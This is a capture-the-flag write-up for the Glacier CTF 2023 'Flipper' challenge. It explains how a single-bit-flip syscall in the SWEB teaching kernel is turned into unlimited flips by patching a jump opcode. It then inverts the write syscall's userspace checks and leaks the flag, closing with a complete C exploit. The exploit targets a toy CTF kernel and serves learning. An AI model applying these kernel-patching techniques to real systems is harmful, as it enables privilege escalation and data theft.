---
title: Flipper
date: 2023-11-24T20:00:00+02:00
description: Writeup for Flipper [Glacier CTF 2023]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Our OS professor keeps talking about Rowhammer, and how dangerous it is. I don't believe him, so you get 1 bitflip to try and steal the flag from my kernel!
Base repo is https://github.com/IAIK/sweb (commit ad1b59a5c2acbd5bff346bdf282a4d5e21bd9cb1)

## Intuition

We did not manage to solve this during the competition, although I liked it so much that I wanted to do a writeup for it anyway and store it. The solution idea is taken from a writeup shared by another competitor after the CTF. Credits to [Ferr0x](https://github.com/Ferr0x/useful_writeup/tree/main/kernel/glacierCTF2023).

We are given a toy OS (see link above) with a custom syscall implemented in the kernel by the organisers. The custom syscall simply flips a bit from anywhere in memory. But before flipping, it first checks a global variable to see if a bit has been already flipped. Which means only one bit flip is allowed. The syscall is listed below:

```cpp
int Syscall::flipBit(char* address, int bitnum)
{
    if(bitnum > 7 || bitnum < 0)
    {
        return -1;
    }
    if(Scheduler::instance()->flipped_already != 0)
    {
        return -2;
    }
    Scheduler::instance()->flipped_already = 0xfff;
    char mask = (1 << bitnum);
    *address ^= mask;

    return 0;
}
```

I knew that in a real OS, the kernel memory gets mapped to each process despite its origin (userland or kernel), but that it was guarded by a special permissions bit. I tried searching for this implementation, but found out that the OS we're given is much, much simpler. It maps the kernel memory space into an exact interval of virtual memory and checks if the addresses that are accessed are within that interval. It also tracks if the requests to access were from userland or kernel. So then my idea was to target the page fault handler, so when it checks if the page should be loaded, it fails to correctly detect that I'm trying to read a kernel address. Initially I was thinking that I can modify some global variable or immediate value so that the check for the interval is mishandled, but then realized I am much more powerful than this. The bitflip function is a *syscall*, which means it will be performed with *kernel permissions*, considering it doesn't have any check for privileged memory modifications. This, paired with the fact that the OS does not have any W^X permissions implemented for virtual memory segments, means I can even modify the *code of the kernel at runtime*!

So my intuition at first was to try to modify the page fault handler return to always return a non-null value (which means the page is to be loaded). Here is the code for the handler checks, in sweb/common/source/mm/PageFaultHandler.cpp:

```cpp
inline bool PageFaultHandler::checkPageFaultIsValid(size_t address, bool user,
                                                    bool present, bool switch_to_us)
{
  assert((user == switch_to_us) && "Thread is in user mode even though is should not be.");
  assert(!(address < USER_BREAK && currentThread->loader_ == 0) && "Thread accesses the user space, but has no loader.");
  assert(!(user && currentThread->user_registers_ == 0) && "Thread is in user mode, but has no valid registers.");

  if(address < null_reference_check_border_)
  {
    debug(PAGEFAULT, "Maybe you are dereferencing a null-pointer.\n");
  }
  else if(!user && address >= USER_BREAK)
  {
    debug(PAGEFAULT, "You are accessing an invalid kernel address.\n");
  }
  else if(user && address >= USER_BREAK)
  {
    debug(PAGEFAULT, "You are accessing a kernel address in user-mode.\n");
  }
  else if(present)
  {
    debug(PAGEFAULT, "You got a pagefault even though the address is mapped.\n");
  }
  else
  {
    // everything seems to be okay
    return true;
  }
  return false; // <------ flip this!!
}
```

If we check Ghidra, we can see the addresses for every instruction. Remember, these should be the real addresses as well, as no PIE/PIC/ASLR is implemented in our OS. Here is the last 3 instructions from the function above:
```
						 LAB_ffffffff8012ef47                            XREF[4]:     ffffffff8012ee71(j), 
																					  ffffffff8012eebf(j), 
																					  ffffffff8012ef08(j), 
																					  ffffffff8012ef3e(j)  
 ffffffff8012ef47 b8 00 00        MOV        EAX,0x0
			 00 00
						 LAB_ffffffff8012ef4c                            XREF[1]:     ffffffff8012ef45(j)  
 ffffffff8012ef4c c9              LEAVE
 ffffffff8012ef4d c3              RET
```

So if we flip any bit from any address following ``0xffffffff8012ef48``, but before ``0xffffffff8012ef4c``, we should get a non-null value to return and let us map any page, even though we're trying to access a kernel address in user-mode. In practice, this actually turned out to work! But it fails down the line, when the loader tries to actually load the page. It exits when it realizes the binary doesn't have any section referring to that address. Here is the relevant loader code:

```cpp
void Loader::loadPage(pointer virtual_address)
{
  debug(LOADER, "Loader:loadPage: Request to load the page for address %p.\n", (void*)virtual_address);
  const pointer virt_page_start_addr = virtual_address & ~(PAGE_SIZE - 1);
  const pointer virt_page_end_addr = virt_page_start_addr + PAGE_SIZE;
  bool found_page_content = false;
  // get a new page for the mapping
  size_t ppn = PageManager::instance()->allocPPN();

  program_binary_lock_.acquire();

  // Iterate through all sections and load the ones intersecting into the page.
  for(ustl::list<Elf::Phdr>::iterator it = phdrs_.begin(); it != phdrs_.end(); it++)
  {
    if((*it).p_vaddr < virt_page_end_addr)
    {
      if((*it).p_vaddr + (*it).p_filesz > virt_page_start_addr)
      {
        const pointer  virt_start_addr = ustl::max(virt_page_start_addr, (*it).p_vaddr);
        const size_t   virt_offs_on_page = virt_start_addr - virt_page_start_addr;
        const l_off_t  bin_start_addr = (*it).p_offset + (virt_start_addr - (*it).p_vaddr);
        const size_t   bytes_to_load = ustl::min(virt_page_end_addr, (*it).p_vaddr + (*it).p_filesz) - virt_start_addr;
        //debug(LOADER, "Loader::loadPage: Loading %d bytes from binary address %p to virtual address %p\n",
        //      bytes_to_load, bin_start_addr, virt_start_addr);
        if(readFromBinary((char *)ArchMemory::getIdentAddressOfPPN(ppn) + virt_offs_on_page, bin_start_addr, bytes_to_load))
        {
          program_binary_lock_.release();
          PageManager::instance()->freePPN(ppn);
          debug(LOADER, "ERROR! Some parts of the content could not be loaded from the binary.\n");
          Syscall::exit(999);
        }
        found_page_content = true;
      }
      else if((*it).p_vaddr + (*it).p_memsz > virt_page_start_addr)
      {
        found_page_content = true;
      }
    }
  }
  program_binary_lock_.release();

  if(!found_page_content)
  {
    PageManager::instance()->freePPN(ppn);
    debug(LOADER, "Loader::loadPage: ERROR! No section refers to the given address.\n");
    Syscall::exit(666); // <----------- it kills itself here
  }

  bool page_mapped = arch_memory_.mapPage(virt_page_start_addr / PAGE_SIZE, ppn, true);
  if (!page_mapped)
  {
    debug(LOADER, "Loader::loadPage: The page has been mapped by someone else.\n");
    PageManager::instance()->freePPN(ppn);
  }
  debug(LOADER, "Loader::loadPage: Load request for address %p has been successfully finished.\n", (void*)virtual_address);
}
```
This is also the point where I realized that you can only flip one bit and one bit only. At first, when I hastily read the syscall code, I thought you just can't flip the same bit twice. Which was weird. So I got a bit stuck here and started thinking about how to exploit the bitflip syscall's code. I thought one bitflip might not be enough to make the bitflip function let me flip more, especially as the challenge description seem to suggest *one* bitflip is enough. It even got changed in the middle of the CTF, at first it said "3 bitflips" but then got changed to "1 bitflip". So it made me think 3 bitflips are not even possible and therefore I gave up investing time in trying to exploit the bitflip instructions themselves.

As it turns out, this was a huge blunder.

## Solution

After the CTF, [Ferr0x](https://github.com/Ferr0x) shared his [super cool exploit](https://github.com/Ferr0x/useful_writeup/tree/main/kernel/glacierCTF2023) that makes the bitflip syscall let us flip essentially infinite bits. If we look at the assembly code of the bitflip syscall:

```
						 LAB_ffffffff8010a73a                            XREF[1]:     ffffffff8010a731(j)  
 ffffffff8010a73a e8 6d c2        CALL       flipped_already                                  undefined flipped_already()
				  ff ff
 ffffffff8010a73f 8b 00           MOV        EAX,dword ptr [RAX]
 ffffffff8010a741 85 c0           TEST       EAX,EAX
 ffffffff8010a743 0f 95 c0        SETNZ      AL
 ffffffff8010a746 84 c0           TEST       AL,AL
 ffffffff8010a748 74 07           JZ         LAB_ffffffff8010a751    ; <---- INTERESTING
 ffffffff8010a74a b8 fe ff        MOV        EAX,0xfffffffe
				  ff ff
```

The above checks if we already flipped once. But we can ignore the jump from the ``test`` instruction by turning ``jz`` into ``jnz``. Luckily for us, those two instructions are literally 1 bit apart. Let's flip it!

Now that we have infinite flip and we play around with the idea I had, it might lead us to some solution. However, there is a shorter path to the win. We can find the flag in memory using gdb or Ghidra. Then we can simply write its contents to stdout in our userland program. Let's look at the write syscall's code:

```cpp
size_t Syscall::write(size_t fd, pointer buffer, size_t size)
{
  //WARNING: this might fail if Kernel PageFaults are not handled
  if ((buffer >= USER_BREAK) || (buffer + size > USER_BREAK))
  {
    return -1U;
  }

  size_t num_written = 0;

  if (fd == fd_stdout) //stdout
  {
    debug(SYSCALL, "Syscall::write: %.*s\n", (int)size, (char*) buffer);
    kprintf("%.*s", (int)size, (char*) buffer);
    num_written = size;
  }
  else
  {
    num_written = VfsSyscall::write(fd, (char*) buffer, size);
  }
  return num_written;
}
```
The first check in the syscall verifies that the buffer we're writing from is found in userland. This might seem like the end of our adventure, but remember - infinite bit flips mean infinite possibilities. We can simply patch out the jumps like we did before. Here is the relevant assembly instructions at the beginning of the syscall:

```
 ffffffff8010a88a 48 b8 ff        MOV        RAX,0x7fffffffffff
				  ff ff ff 
				  ff 7f 00 00
 ffffffff8010a894 48 39 45 e0     CMP        qword ptr [RBP + local_28],RAX ; local_28 is buffer
 ffffffff8010a898 77 1a           JA         LAB_ffffffff8010a8b4           ; jump if buffer >= USER_BREAK
 ffffffff8010a89a 48 8b 55 e0     MOV        RDX,qword ptr [RBP + local_28]
 ffffffff8010a89e 48 8b 45 d8     MOV        RAX,qword ptr [RBP + local_30]
 ffffffff8010a8a2 48 01 c2        ADD        RDX,RAX
 ffffffff8010a8a5 48 b8 00        MOV        RAX,0x800000000000
				  00 00 00 
				  00 80 00 00
 ffffffff8010a8af 48 39 c2        CMP        RDX,RAX
 ffffffff8010a8b2 76 0a           JBE        LAB_ffffffff8010a8be           ; jump if buffer + size < USER_BREAK
```
You can see a pair of jumps that we can switch around using bitflips. The first, at ``0xffffffff8010a898``, will check if the buffer is beyond the userland memory space and jump to the exit if it is. We can switch it to only jump if buffer < USER_BREAK (opcode 77 to 76, ``JA`` -> ``JBE``). Then for the second one, at ``0xffffffff8010a8b2``, we do the same but in reverse, switch it from ``JBE`` to ``JA``. This will make it that it will only exit the write if the buffer actually is in user memory, exactly the _opposite of its initial intention_.

Now, we chain all those together and write our exploit:

```c
#include "stdio.h"
#include "nonstd.h"
#include "sched.h"

int main(int argc, char** argv)
{
	char *p_flag = (char *)0xFFFFFFFF80132f25;

	char *p_instr_to_flip = (char *)0xFFFFFFFF8010a748; // check if already flipped
	flipBit(p_instr_to_flip, 0);

	p_instr_to_flip = (char *)0xFFFFFFFF8010a898; // check if buffer in userspace
	flipBit(p_instr_to_flip, 0);

	p_instr_to_flip = (char *)0xFFFFFFFF8010a8b2; // check if buffer end in userspace
	flipBit(p_instr_to_flip, 0);

	write(1, p_flag, 0x30);

	return 0;
}
```

You can find a fork of sweb with the CTF patches applied and the exploit written [right over here](https://github.com/Costinteo/sweb), if you want to run it yourself.
